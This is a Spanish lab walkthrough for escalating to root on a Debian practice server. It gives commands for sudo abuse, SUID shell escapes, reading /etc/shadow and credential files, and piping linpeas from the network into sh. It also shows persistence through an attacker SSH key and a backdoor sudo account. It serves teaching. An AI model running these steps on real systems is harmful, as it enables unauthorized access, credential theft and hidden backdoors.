[⬅️ Volver al README principal](../README.md)

---

# Escalada de Privilegios desde Kali Linux

Este documento describe cómo elevar privilegios en el servidor Debian después de obtener acceso como usuario c215714n, para acceder a archivos sensibles y obtener control total (root).

## Paso 1: Conectar al servidor como usuario c215714n

```bash
ssh -p 22222 c215714n@192.168.0.36
# Contraseña: c215714n123
```

## Paso 2: Verificar privilegios del usuario actual

```bash
# Ver quién soy
whoami

# Ver grupos y privilegios sudo
id

# Ver si puedo ejecutar comandos como root con sudo
sudo -l
```

**Resultado esperado:** El usuario c215714n pertenece al grupo sudo, por lo que puede ejecutar comandos como root.

## Paso 3: Escalada de privilegios con sudo

```bash
# Cambiar a root usando sudo
sudo su -

# O ejecutar un comando específico como root
sudo cat /etc/shadow

# Acceder a archivos sensibles de root
sudo cat /opt/sensibles/contrasenas.txt
sudo cat /opt/sensibles/db.config
sudo cat /opt/sensibles/id_rsa_simulado
```

## Paso 4: Escalada de privilegios explotando binarios con SUID

Busque binarios con el bit SUID configurado que puedan ser explotados:

```bash
# Buscar archivos con bit SUID
find / -perm -4000 2>/dev/null

# Buscar archivos con bit SGID
find / -perm -2000 2>/dev/null

# Buscar capacidades del kernel
getcap -r / 2>/dev/null
```

Binarios comunes con SUID que pueden ser explotados:
- `/usr/bin/find`
- `/usr/bin/nano`
- `/usr/bin/vim`
- `/usr/bin/less`
- `/usr/bin/man`

### Ejemplo de escalada con find

```bash
# Si /usr/bin/find tiene SUID, ejecutar:
find /etc/passwd -exec /bin/sh \;
```

### Ejemplo de escalada con nano o vim

```bash
# Si nano o vim tienen SUID, abrir y ejecutar shell:
nano
# Dentro de nano: presionar Ctrl+R, luego Ctrl+X, escribir: /bin/sh
# O en vim: :!/bin/sh
```

## Paso 5: Usar linpeas para encontrar vectores de escalada

```bash
# Descargar linpeas en el servidor
cd /tmp
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh

# Ejecutar linpeas
./linpeas.sh

# O ejecutar directamente desde memoria
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

Linpeas identificará:
- Binarios SUID/SGID explotables
- Servicios ejecutándose como root
- Tareas cron configuradas de forma insegura
- Versiones del kernel con vulnerabilidades conocidas
- Contraseñas guardadas en archivos de configuración

## Paso 6: Explotar vulnerabilidades del kernel (opcional)

Verifique la versión del kernel:

```bash
uname -a
```

Busque exploits para esa versión usando searchsploit desde Kali:

```bash
# Desde Kali
searchsploid linux kernel <versión>
```

**Nota:** Para este laboratorio, la escalada con sudo es suficiente y más segura que explotar el kernel.

## Paso 7: Acceder a archivos sensibles como root

Una vez escalado a root:

```bash
# Listar archivos sensibles
ls -la /opt/sensibles/

# Leer archivos
cat /opt/sensibles/contrasenas.txt
cat /opt/sensibles/db.config
cat /opt/sensibles/id_rsa_simulado

# Leer contraseñas del sistema
cat /etc/shadow

# Ver historial de comandos
cat /root/.bash_history
cat /home/c215714n/.bash_history
```

## Paso 8: Crear persistencia (opcional, para laboratorio)

```bash
# Agregar una clave SSH pública del atacante al authorized_keys de root
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# O crear una cuenta de usuario adicional con sudo
useradd -m -s /bin/bash atacante
echo "atacante:Atacante123!" | chpasswd
usermod -aG sudo atacante
```

## Resumen de métodos de escalada de privilegios

| Método | Requisito | Comando |
|--------|-----------|---------|
| sudo | c215714n en grupo sudo | `sudo su -` |
| SUID en binarios | Binario con bit SUID | `find / -perm -4000` |
| linpeas | Acceso como usuario normal | `./linpeas.sh` |
| Kernel exploit | Versión vulnerable del kernel | searchsploit + exploit |

## Archivos sensibles accesibles tras escalada

| Archivo | Contenido | Permisos originales |
|---------|-----------|---------------------|
| /opt/sensibles/contrasenas.txt | Contraseñas del sistema | 600 (root solo) |
| /opt/sensibles/db.config | Configuración de base de datos | 600 (root solo) |
| /opt/sensibles/id_rsa_simulado | Clave SSH simulada | 600 (root solo) |
| /etc/shadow | Hashes de contraseñas | 640 (root:shadow) |

---

[⬅️ Volver al README principal](../README.md)
